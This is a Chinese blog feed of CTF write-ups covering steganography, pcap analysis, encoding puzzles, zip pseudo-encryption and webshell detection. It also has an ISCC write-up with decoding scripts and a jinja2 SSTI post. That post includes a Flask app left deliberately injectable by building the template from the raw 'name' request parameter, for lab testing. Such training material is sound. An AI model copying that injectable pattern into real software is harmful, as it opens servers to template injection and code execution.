src="https://s2.loli.net/2022/12/28/leBgrAkVcvNFn1M.png" alt="image-20221228105018011" style="zoom:33%;" /><p>得到压缩包后发现需要密码，我们查看 misc2.jpg 的 exif信息，发现密码：</p><img src="https://s2.loli.net/2022/12/28/5snx8yi3K4egZQz.png" alt="image-20221228105200641" style="zoom: 50%;" /><p>打开压缩包得到flag</p><h2 id="easycap"><a href="#easycap" class="headerlink" title="easycap"></a>easycap</h2><p>下载得到 <code>pcap</code>  文件，使用 <code>wireshark</code> 打开 随便选择一个追踪tcp流得到flag</p><p><img src="https://s2.loli.net/2022/12/28/d7yPe9IuLkjZSx2.png" alt="image-20221228110027461"></p><h2 id="隐藏的钥匙"><a href="#隐藏的钥匙" class="headerlink" title="隐藏的钥匙"></a>隐藏的钥匙</h2><blockquote><p>hint：路飞一行人千辛万苦来到了伟大航道的终点，找到了传说中的One piece，但是需要钥匙才能打开One Piece大门，钥匙就隐藏在下面的图片中，聪明的你能帮路飞拿到钥匙，打开One Piece的大门吗？</p></blockquote><img src="https://s2.loli.net/2022/12/28/5uJ3OCAtzHkFSUs.png" alt="image-20221228110238160" style="zoom:33%;" /><p>使用 010Editor 打开图片找到flag，使用base64解码即可</p><h2 id="另外一个世界"><a href="#另外一个世界" class="headerlink" title="另外一个世界"></a>另外一个世界</h2><img src="https://s2.loli.net/2022/12/28/25SjmlLoW8aGbJR.png" alt="image-20221228110625778" style="zoom:33%;" /><p>打开图片发现末尾有一串二进制，我们将其转为10进制后，对照ascii码表得到对应字符，即flag</p><p>或者将2进制转为16进制，然后16进制转文本，得到flag</p><img src="https://s2.loli.net/2022/12/28/z5PoCQMr7FDStdL.png" alt="image-20221228110908654" style="zoom:33%;" /><img src="https://s2.loli.net/2022/12/28/qc3ZBFDSb4TmzkR.png" alt="image-20221228111227450" style="zoom:33%;" /><h2 id="FLAG"><a href="#FLAG" class="headerlink" title="FLAG"></a>FLAG</h2><p>下载后得到一张图片，我们用 <code>stegsolve</code> 打开 </p><img src="https://s2.loli.net/2022/12/28/XNCkMURVgvixw4O.png" alt="image-20221228112703717" style="zoom:33%;" /><p><code>Data Extract</code> 模式选择0色道， 发现是个 zip文件，我们保存为zip文件</p><p>打开时，发现文件已损坏，没关系，照样解压得到 一个文件 <code>1</code></p><p>我们在 kali 使用 <code>file</code> 命令，查看文件类型</p><img src="https://s2.loli.net/2022/12/28/zQsPAi9qLphRIHS.png" alt="image-20221228112922977" style="zoom:33%;" /><p>发现是一个 ELF 文件，</p><p>我们使用 strings 命令去查找可打印的字符串：</p><blockquote><p><strong>strings</strong>命令在对象文件或二进制文件中查找可打印的字符串。</p></blockquote><img src="https://s2.loli.net/2022/12/28/aMTS3lOfjtHRvuF.png" alt="image-20221228113122239" style="zoom:33%;" /><p>得到flag</p><p>或者我们可以使用 <code>ida</code> 打开</p><img src="https://s2.loli.net/2022/12/28/2Hf7JBuQtgUqVyh.png" alt="image-20221228113327435" style="zoom:33%;" /><h2 id="神秘龙卷风"><a href="#神秘龙卷风" class="headerlink" title="神秘龙卷风"></a>神秘龙卷风</h2><blockquote><p>hint：神秘龙卷风转转转，科学家用四位数字为它命名，但是发现解密后居然是一串外星人代码！！好可怕！</p></blockquote><p>下载得到rar压缩包，打开需要密码，根据hint，我们爆破得到4位数密码，打开txt文件：</p><p><img src="https://s2.loli.net/2022/12/28/V6mEJKTxF1MYAPR.png" alt="image-20221228113749319"></p><p>发现很多 + . &gt; 组成的加密，经过查找，我们发现这是 <strong>brainfuck编码</strong></p><p><img src="https://s2.loli.net/2022/12/28/2YWbSkodC3AXGyI.png" alt="image-20221228114052355"></p><p><a href="https://www.splitbrain.org/services/ook">解密网站</a></p><img src="https://s2.loli.net/2022/12/28/reET5R82koAm6q4.png" alt="image-20221228114143391" style="zoom: 33%;" /><p>解密得到flag</p><h2 id="假如给我三天光明"><a href="#假如给我三天光明" class="headerlink" title="假如给我三天光明"></a>假如给我三天光明</h2><p>下载后得到一个压缩包</p><img src="https://s2.loli.net/2022/12/28/UwuA3LWTtizjYBk.png" alt="image-20221228114317609" style="zoom:33%;" /><p>压缩包中有music压缩包和一张图片，music压缩包需要密码</p><p>我们查看该图片：</p><img src="https://s2.loli.net/2022/12/28/gqWlpC86xQueomI.png" alt="image-20221228114439250" style="zoom:33%;" /><p>图片下面有一些不认识的符号，我们想到：海伦是一个盲人。所以联想到下面可能是盲文：</p><p><img src="https://s2.loli.net/2022/12/28/TwLUPDs8kVymCYB.png" alt="img"></p><p>我们一一对照得到：<code>kmdonowg</code></p><p>这样我们就得到压缩包密码，解压它，得到一段音频：</p><img src="https://s2.loli.net/2022/12/28/whZKdBr4CRXiFgA.png" alt="image-20221228114758298" style="zoom:33%;" /><p>我们使用 <code>Audacity</code> 音频分析工具打开：</p><p><img src="https://s2.loli.net/2022/12/28/937HgMlUiy6DQJr.png" alt="image-20221228114907049"></p><p>发现音频 一长一短的规律，我们知道，这可能是 <code>莫斯电码</code></p><p>我们将 长段置为: <code>-</code> 短段置为: <code>.</code>  中间使用空格分隔，就得到：</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">-<span class="hljs-string">.-.</span>  -  <span class="hljs-string">..-.</span>  <span class="hljs-string">.--</span>  <span class="hljs-string">.--.</span>  .  <span class="hljs-string">..</span>  <span class="hljs-params">-----</span>  <span class="hljs-params">---</span><span class="hljs-string">..</span>  --<span class="hljs-string">...</span>  <span class="hljs-string">...--</span>  <span class="hljs-string">..---</span>  <span class="hljs-string">..--..</span>  <span class="hljs-string">..---</span>  <span class="hljs-string">...--</span>  -<span class="hljs-string">..</span>  --<span class="hljs-string">..</span><br></code></pre></td></tr></table></figure><p><a href="http://www.zhongguosou.com/zonghe/moErSiCodeConverter.aspx">莫斯电码转换</a></p><p>使用网站转换得到flag</p><h2 id="数据包中的线索"><a href="#数据包中的线索" class="headerlink" title="数据包中的线索"></a>数据包中的线索</h2><blockquote><p>hint：公安机关近期截获到某网络犯罪团伙在线交流的数据包，但无法分析出具体的交流内容，聪明的你能帮公安机关找到线索吗？</p></blockquote><p>我们将流量包使用 <code>wireshark</code>  打开，因为hint说，在线交流数据包，我们过滤，查找http的包就可：</p><p><img src="https://s2.loli.net/2022/12/28/XesBqvKycC8Y7GE.png" alt="image-20221228115755297"></p><p>追踪http流，发现存在base64编码：</p><img src="https://s2.loli.net/2022/12/28/uP5fnsey8ISADVL.png" alt="image-20221228115843441" style="zoom: 33%;" /><p><a href="https://the-x.cn/base64">base64解密</a></p><p>网站解密一下，发现是jpg文件，保存为jpg，打开得到flag</p><img src="https://s2.loli.net/2022/12/28/ozgndHbjkUlEDt3.png" alt="image-20221228115955612" style="zoom:33%;" /><h2 id="后门查杀"><a href="#后门查杀" class="headerlink" title="后门查杀"></a>后门查杀</h2><blockquote><p>hint：小白的网站被小黑攻击了，并且<strong>上传了Webshell</strong>，你能帮小白找到这个后门么？(Webshell中的密码(md5)即为答案)</p></blockquote><p>根据提示，网站上传了webshell后门，于是我们可以使用 <code>D盾</code> 扫描目录即可(或者使用杀毒软件扫描)</p><blockquote><p>D盾是目前最为流行和好用的<strong>web查杀工具</strong>，同时使用也简单方便，在web应急处置的过程中经常会用到。 D盾的功能比较强大， 最常见使用方式包括如下功能：1、查杀webshell，隔离可疑文件；2、端口进程查看、base64解码以及克隆账号检测等辅助工具；3、文件监控。</p></blockquote><p><img src="https://s2.loli.net/2022/12/28/btyD9NHreQLMOsc.png" alt="image-20221228125408524"></p><p>如图，扫到了网站后门，打开include.php就看到了flag：</p><img src="https://s2.loli.net/2022/12/28/b1ZdzLAwQSsaTFi.png" alt="image-20221228125505610" style="zoom:25%;" /><h2 id="webshell后门"><a href="#webshell后门" class="headerlink" title="webshell后门"></a>webshell后门</h2><blockquote><p>hint：朋友的网站被黑客上传了webshell后门，他把网站打包备份了，你能帮忙找到黑客的webshell在哪吗？(Webshell中的密码(md5)即为答案)。</p></blockquote><p>同样使用 <code>D盾</code> 扫描得到flag</p><img src="https://s2.loli.net/2022/12/28/9LAjzEa7Wg8ilqD.png" alt="image-20221228125807186" style="zoom:33%;" /><img src="https://s2.loli.net/2022/12/28/lKHgpJWROevSIsa.png" alt="image-20221228125755116" style="zoom:25%;" /><h2 id="来首歌吧"><a href="#来首歌吧" class="headerlink" title="来首歌吧"></a>来首歌吧</h2><p>下载得到一个音频文件，使用 <code>Audacity</code> 打开：</p><p><img src="https://s2.loli.net/2022/12/28/azZLlrFOes6Q74D.png"></p><p>发现为莫斯电码，解密得到flag</p><h2 id="荷兰宽带数据泄露"><a href="#荷兰宽带数据泄露" class="headerlink" title="荷兰宽带数据泄露"></a>荷兰宽带数据泄露</h2><p>下载得到一个 <code>conf.bin</code> 文件，根据题目名称，我们猜测这个文件与宽带数据有关系。</p><p>查资料得到一款工具：<code>RouterPassView</code></p><blockquote><p>RouterPassView是一个找回路由器密码的工具。大多数现代路由器允许备份到一个文件路由器的配置，然后从文件中恢复配置时的需要。路由器的备份文件通常包含了像ISP的用户名重要数据&#x2F;密码，路由器的登录密码，无线网络的关键。如果失去了这些密码1 &#x2F;钥匙，但仍然有路由器配置的备份文件，RouterPassView可以帮助你从你的路由器恢复您丢失密码的文件。</p></blockquote><p>我们将 bin 文件使用 工具打开：</p><img src="https://s2.loli.net/2022/12/28/rs3lUimtyVL8BZf.png" alt="image-20221228131417929" style="zoom:33%;" /><p>这个username就是flag</p><h2 id="面具下的flag"><a href="#面具下的flag" class="headerlink" title="面具下的flag"></a>面具下的flag</h2><p>下载得到jpg图片，使用 <code>binwalk</code> 分割图片：</p><img src="https://s2.loli.net/2022/12/28/TOte6g21ivqDxaQ.png" alt="image-20221228131925136" style="zoom: 33%;" /><p>得到</p><p>一个zip压缩包，打开发现需要密码，我们使用 <code>010Editor</code> 打开zip ，发现是伪加密，</p><img src="https://s2.loli.net/2022/12/28/CULXpoEzAVuqM3i.png" alt="image-20221228132045875" style="zoom: 50%;" /><p>将这里改为 <code>00 00</code> 即可打开</p><p>得到一个 <code>flag.vmdk</code> 文件</p><blockquote><p>VMDK（ <strong>VMWare Virtual Machine Disk Format</strong>）是 虚拟机  VMware创建的虚拟硬盘格式，文件存在于VMware文件系统中，被称为 VMFS （ 虚拟机文件系统 ）。  一个VMDK文件代表VMFS在虚拟机上的一个物理硬盘驱动。 所有用户数据和有关 虚拟服务器 的配置信息都存储在VMDK文件中。  通常而言，VMDK文件容易比较大，所以，2TB大小的文件都不足为奇。</p></blockquote><p>但是我们这里vmdk不到3mb，经过查找，我们知道了：<strong>vmdk文件可以解压</strong></p><img src="https://s2.loli.net/2022/12/28/IgvYdhzubASQHMG.png" alt="image-20221228134024473" style="zoom:33%;" /><img src="https://s2.loli.net/2022/12/28/EKzisyNcUY2ZF1P.png" alt="image-20221228134152695" style="zoom:33%;" /><p>我们使用kali中的 7z命令 x代表分割文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">7z x flag.vmdx<br></code></pre></td></tr></table></figure><p>分隔得到几个文件夹：</p><p><img src="https://s2.loli.net/2022/12/28/x3YkPHpZmKXErgd.png" alt="image-20221228134302807"></p><p>打开 <code>part_one</code> :</p><p><img src="https://s2.loli.net/2022/12/28/Skmh3DEtcGyTwIl.png" alt="image-20221228134331468"></p><p>这是 <code>brainfuck</code> 编码，解码一下：<a href="https://www.splitbrain.org/services/ook">解码</a></p><img src="https://s2.loli.net/2022/12/28/vGQNar6c7dIDsC5.png" alt="image-20221228134500547" style="zoom:33%;" /><p>打开<code>part_two</code>：</p><p><img src="https://s2.loli.net/2022/12/28/FLjz6psxVXQ8wE1.png" alt="image-20221228134541888"></p><p>这个是<code>ook编码</code>，我们继续使用该网站解码</p><img src="https://s2.loli.net/2022/12/28/9hXoNyUTRMuw58I.png" alt="image-20221228134609467" style="zoom:33%;" /><h2 id="九连环"><a href="#九连环" class="headerlink" title="九连环"></a>九连环</h2><p>首先下载文件，得到一张<code>123456cry.jpg</code>图片</p><p>将 图片使用 <code>foremost</code> 进行分离：</p><img src="https://s2.loli.net/2022/12/28/RLGjNnsOU81CKBo.png" alt="image-20221228143122234" style="zoom:33%;" /><p>得到一个zip压缩包，打开发现里面的图片需要密码：</p><img src="https://s2.loli.net/2022/12/28/mAHYU2JeL1sjMu4.png" alt="image-20221228143239856" style="zoom:33%;" /><p>我们使用 <code>Ziperello</code> 扫一下，却发现没有加密：</p><img src="https://s2.loli.net/2022/12/28/H4r8e3uwbxtSDWK.png" alt="image-20221228143321641" style="zoom: 25%;" /><p>这说明了，压缩包是伪加密，我们我们使用 <code>010Editor</code> 打开，修改相应位置：</p><img src="https://s2.loli.net/2022/12/28/WftsxV1kDlXeZPS.png" alt="image-20221228143701892" style="zoom:33%;" /><p>然后得到一张jpg图片和一个压缩包：</p><img src="https://s2.loli.net/2022/12/28/tqzXwGnEpTQAk2c.png" alt="image-20221228143758774" style="zoom:33%;" /><p>我们使用 <code>binwalk</code> 、<code>foremost </code>分离图片，却没有用。。</p><p>这时，查询得知，有一款工具 : <code>steghide</code></p><h4 id="Steghide"><a href="#Steghide" class="headerlink" title="Steghide"></a>Steghide</h4><blockquote><p><strong>Steghide</strong>是一款开源的隐写术软件，它可以让你<strong>在一张图片或者音频文件中隐藏你的秘密信息</strong>，而且你不会注意到图片或音频文件发生了任何的改变。而且，你的秘密文件已经隐藏在了原始图片或音频文件之中了。这是一个命令行软件。因此，你需要学习使用这个工具的命令。你需要通过命令来实现将秘密文件嵌入至图片或音频文件之中。除此之外，你还需要使用其他的命令来提取你隐藏在图片或音频中的秘密文件。</p></blockquote><p><strong>用法介绍：</strong></p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs sas">embed, –embed embed data<br>extract, –extract extract data<br>-ef, –embedfile <span class="hljs-keyword">select</span> <span class="hljs-keyword">file</span> to be embedded<br>-ef （<span class="hljs-keyword">filename</span>） embed the <span class="hljs-keyword">file</span> <span class="hljs-keyword">filename</span><br>-cf, –coverfile <span class="hljs-keyword">select</span> cover-<span class="hljs-keyword">file</span><br>-cf （<span class="hljs-keyword">filename</span>） embed <span class="hljs-keyword">into</span> the <span class="hljs-keyword">file</span> <span class="hljs-keyword">filename</span><br>-p, –passphrase specify passphrase<br>-p （passphrase） use to embed data<br>-sf, –stegofile <span class="hljs-keyword">select</span> stego <span class="hljs-keyword">file</span><br>-sf （<span class="hljs-keyword">filename</span>） write result to <span class="hljs-keyword">filename</span> instead of cover-<span class="hljs-keyword">file</span><br></code></pre></td></tr></table></figure><p><strong>用法示例：</strong></p><p>将secret.txt文件隐藏到text.jpg中：</p><p><code>steghide embed -cf test.jpg -ef secret.txt -p 123456</code></p><p>从text.jpg解出secret.txt:</p><p><code>steghide extract -sf test.jpg -p 123456</code></p><p>我们在kali中安装它，然后使用<code>steghide</code> 解出数据:</p><p><code>steghide extract -sf good.jpg</code></p><img src="https://s2.loli.net/2022/12/28/OXCt5EhJxdSFz3n.png" alt="image-20221228144417115" style="zoom:33%;" /><p>此处没有密码。我们得到txt文件，包含了压缩包的密码</p><p>用密码打开压缩包得到flag</p><h2 id="相关工具、命令"><a href="#相关工具、命令" class="headerlink" title="相关工具、命令:"></a>相关工具、命令:</h2><h5 id="StegSolve"><a href="#StegSolve" class="headerlink" title="StegSolve"></a>StegSolve</h5><h5 id="QR-Research"><a href="#QR-Research" class="headerlink" title="QR Research"></a>QR Research</h5><h5 id="010Editor"><a href="#010Editor" class="headerlink" title="010Editor"></a>010Editor</h5><h5 id="Ziperello"><a href="#Ziperello" class="headerlink" title="Ziperello"></a>Ziperello</h5><h5 id="ARCHPR"><a href="#ARCHPR" class="headerlink" title="ARCHPR"></a>ARCHPR</h5><h5 id="wireshark-1"><a href="#wireshark-1" class="headerlink" title="wireshark"></a>wireshark</h5><h5 id="Audacity"><a href="#Audacity" class="headerlink" title="Audacity"></a>Audacity</h5><h5 id="D盾"><a href="#D盾" class="headerlink" title="D盾"></a>D盾</h5><h5 id="RouterPassView"><a href="#RouterPassView" class="headerlink" title="RouterPassView"></a>RouterPassView</h5><h5 id="Steghide-1"><a href="#Steghide-1" class="headerlink" title="Steghide"></a>Steghide</h5><hr><h5 id="foremost"><a href="#foremost" class="headerlink" title="foremost"></a>foremost</h5><h5 id="binwalk"><a href="#binwalk" class="headerlink" title="binwalk"></a>binwalk</h5>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>MISC(第1页wp)</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>jinja2_SSTI知识点</title>
    <link href="/2023/08/24/jinja2_SSTI%E7%9F%A5%E8%AF%86%E7%82%B9/"/>
    <url>/2023/08/24/jinja2_SSTI%E7%9F%A5%E8%AF%86%E7%82%B9/</url>
    
    <content type="html"><![CDATA[<h2 id="jinja2【SSTI知识点】"><a href="#jinja2【SSTI知识点】" class="headerlink" title="jinja2【SSTI知识点】"></a>jinja2【SSTI知识点】</h2><p>我们先在虚拟机使用<code>pip</code>命令安装<code>jinja2</code></p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">pip <span class="hljs-keyword">install</span> jinja2<br></code></pre></td></tr></table></figure><p>查看了一下虚拟机的ip：<code>192.168.56.128</code></p><p>然后我们在虚拟机搭建实验环境：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request<br><span class="hljs-keyword">from</span> jinja2 <span class="hljs-keyword">import</span> Template<br><br>app = Flask(__name__)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    name = request.args.get(<span class="hljs-string">&#x27;name&#x27;</span>, <span class="hljs-string">&#x27;guest&#x27;</span>)<br><br>    t = Template(<span class="hljs-string">&quot;Hello &quot;</span> + name)<br>    <span class="hljs-keyword">return</span> t.render()<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    app.run(debug=<span class="hljs-literal">True</span>,host=<span class="hljs-string">&#x27;192.168.56.128&#x27;</span>,port=<span class="hljs-number">80</span>)<br><br></code></pre></td></tr></table></figure><p>主机访问：</p><p><img src="https://s2.loli.net/2023/04/28/h3XstifUPjDlKMr.png" alt="image-20230428192106358"></p><p>环境搭建成功，然后我们就可以开始测试了</p><p><a href="https://jinja.palletsprojects.com/en/2.11.x/templates/#builtin-filters">官方过滤器文档</a></p><p><a href="https://blog.csdn.net/m0_62594265/article/details/126226921">ctfshow SSTI 知识点总结</a></p><p><a href="https://blog.csdn.net/miuzzx/article/details/110220425">SSTI模板注入绕过（进阶篇）</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>jinja2_SSTI知识点</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ISCC1</title>
    <link href="/2023/08/24/ISCC1/"/>
    <url>/2023/08/24/ISCC1/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="【ISCC1】"><a href="#【ISCC1】" class="headerlink" title="【ISCC1】"></a>【ISCC1】</h2><h3 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h3><h4 id="好看的维吾尔族小姐姐"><a href="#好看的维吾尔族小姐姐" class="headerlink" title="好看的维吾尔族小姐姐"></a>好看的维吾尔族小姐姐</h4><blockquote><p>五十六个民族，五十六支花，五十六个兄弟姐妹是一家。现如今，民族团结的思想早已深入人心，而维吾尔族又是中华民族的重要组成部分，解决本题需要各位解题人知晓维吾尔族同胞的说话方式。</p></blockquote><p>将图片该高度，获得一张类似二维码的图片，将图片水平反转一下，然后扫码(换了好几个网站)得到逆序的<code>html实体编码</code>，反过来，然后解码，得到flag</p><img src="https://s2.loli.net/2023/05/02/JtiokejqO3QhHLz.png" alt="Untitled" style="zoom:33%;" /><img src="https://s2.loli.net/2023/05/02/ZImqbYPCzi6f9rT.png" alt="image-20230502085711415" style="zoom:33%;" /><h4 id="菜鸟黑客1"><a href="#菜鸟黑客1" class="headerlink" title="菜鸟黑客1"></a>菜鸟黑客1</h4><h4 id="消息传递"><a href="#消息传递" class="headerlink" title="消息传递"></a>消息传递</h4><p>在<code>pcapng</code>文件的<strong>smtp协议</strong>中分析分离出来一个rar压缩包</p><img src="https://s2.loli.net/2023/05/02/kA8Veg2O7EiaJmp.png" alt="image-20230502093946329" style="zoom:33%;" /><p>但不知道密码，</p><p><img src="https://s2.loli.net/2023/05/02/SwVusl7LNQ8JGqY.png" alt="image-20230502094111429"></p><p>这两个拼起来就是密码，解压一下：</p><p><img src="https://s2.loli.net/2023/05/02/7k2KjH8gxsmoI19.png" alt="image-20230502094134077"></p><p>这是二进制，我们写脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><br>b = <span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">113</span>):<br>    name = <span class="hljs-built_in">str</span>(i) + <span class="hljs-string">&quot;.png&quot;</span><br>    path = os.path.join(<span class="hljs-string">&quot;C://Users/LIKE/Desktop/picture&quot;</span>, name)<br>    img = Image.<span class="hljs-built_in">open</span>(path)<br>    value = img.getpixel((<span class="hljs-number">0</span>, <span class="hljs-number">0</span>))<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;255&quot;</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>(value):<br>        b += <span class="hljs-string">&quot;0&quot;</span><br>    <span class="hljs-keyword">else</span>:<br>        b += <span class="hljs-string">&quot;1&quot;</span><br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">112</span>, <span class="hljs-number">8</span>):<br>    num = b[i:i+<span class="hljs-number">8</span>]<br><br>    n = <span class="hljs-built_in">int</span>(num, <span class="hljs-number">2</span>)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(n), end=<span class="hljs-string">&quot;&quot;</span>)<br>    <br><span class="hljs-comment"># ISCC&#123;i2s0c2c3&#125;</span><br></code></pre></td></tr></table></figure><p>然后使用字典替换一下字符即可</p><h4 id="你相信AI吗？"><a href="#你相信AI吗？" class="headerlink" title="你相信AI吗？"></a>你相信AI吗？</h4><p>在文件夹中新建一个out文件夹，然后使用脚本，</p><p>先跑一下这个脚本：main1.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> cv2<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>):<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">f&quot;./dataset/<span class="hljs-subst">&#123;i&#125;</span>.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:<br>        data = f.read().splitlines()<br><br><br>    image_data = np.array([<span class="hljs-built_in">float</span>(line) <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> data])<br><br>    <span class="hljs-comment"># dic = &#123;X: int(image_data.shape[0] / X) for X in range(1, image_data.shape[0]) if image_data.shape[0] % X == 0&#125;</span><br><br><br>    <span class="hljs-comment"># for width, height in dic.items():</span><br>    <span class="hljs-keyword">if</span> image_data.shape[<span class="hljs-number">0</span>] == <span class="hljs-number">2352</span>:<br>        cv2.imwrite(<span class="hljs-string">f&quot;./out/<span class="hljs-subst">&#123;i&#125;</span>.png&quot;</span>, image_data.reshape(<span class="hljs-number">84</span>, <span class="hljs-number">28</span>))<br>    <span class="hljs-keyword">elif</span> image_data.shape[<span class="hljs-number">0</span>] == <span class="hljs-number">1568</span>:<br>        cv2.imwrite(<span class="hljs-string">f&quot;./out/<span class="hljs-subst">&#123;i&#125;</span>.png&quot;</span>, image_data.reshape(<span class="hljs-number">56</span>, <span class="hljs-number">28</span>))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(i)<br></code></pre></td></tr></table></figure><p>跑完了就在out文件夹中生成了很多数字图片，然后我们在跑一个脚本：</p><p>main2.py:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">import</span> itertools<br><span class="hljs-keyword">import</span> contextlib<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">has_visible_bytes</span>(<span class="hljs-params">input_bytes</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">all</span>(<span class="hljs-built_in">chr</span>(byte) <span class="hljs-keyword">in</span> string.printable <span class="hljs-keyword">for</span> byte <span class="hljs-keyword">in</span> input_bytes)<br><br>cipher_text = <span class="hljs-string">&#x27;51 59 75 95 56 46 669 70 28 687 78 59 51 05 02 684 28 50 99 55 686 685 99 687 53 05 75 27 683 56 96 96&#x27;</span>.split(<span class="hljs-string">&quot; &quot;</span>)<br><span class="hljs-comment"># 需要人眼OCR以下out文件夹内的输出</span><br><span class="hljs-comment"># cipher_text = &#x27;所有图像的ascii,空格隔开,上面的那行数字动态的&#x27;.split(&quot; &quot;)</span><br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;out.txt&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> itertools.permutations(<span class="hljs-string">&quot;0123456789&quot;</span>, <span class="hljs-number">10</span>):<br>        maktrans = <span class="hljs-built_in">str</span>.maketrans(<span class="hljs-string">&quot;0123456789&quot;</span>, <span class="hljs-string">&#x27;&#x27;</span>.join(i))<br><br>        lis = [<span class="hljs-built_in">str</span>.translate(i, maktrans) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> cipher_text]<br>        <br>        <span class="hljs-keyword">with</span> contextlib.suppress(Exception):<br>            plan_text = <span class="hljs-built_in">bytes</span>(<span class="hljs-built_in">list</span>(<span class="hljs-built_in">map</span>(<span class="hljs-keyword">lambda</span> x: <span class="hljs-built_in">int</span>(x), lis)))<br>            <span class="hljs-keyword">if</span> has_visible_bytes(plan_text):<br>                <span class="hljs-built_in">print</span>(plan_text)<br>                f.write(plan_text + <span class="hljs-string">b&quot;\n&quot;</span>)<br></code></pre></td></tr></table></figure><p>注意要将out文件夹中图片的值填入：<code>cipher_text</code></p><p>跑一下脚本，生成很多字符串，我们寻找 <code>ISCC</code>的base64编码：<code>SVNDQ</code></p><img src="https://s2.loli.net/2023/05/03/y2wul5A4bfvB3co.png" alt="img" style="zoom:33%;" /><p>base64解码得到flag</p><h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><h4 id="羊了个羊"><a href="#羊了个羊" class="headerlink" title="羊了个羊"></a>羊了个羊</h4><p><img src="https://s2.loli.net/2023/05/03/ubaCNdI6t2zJ3X8.png" 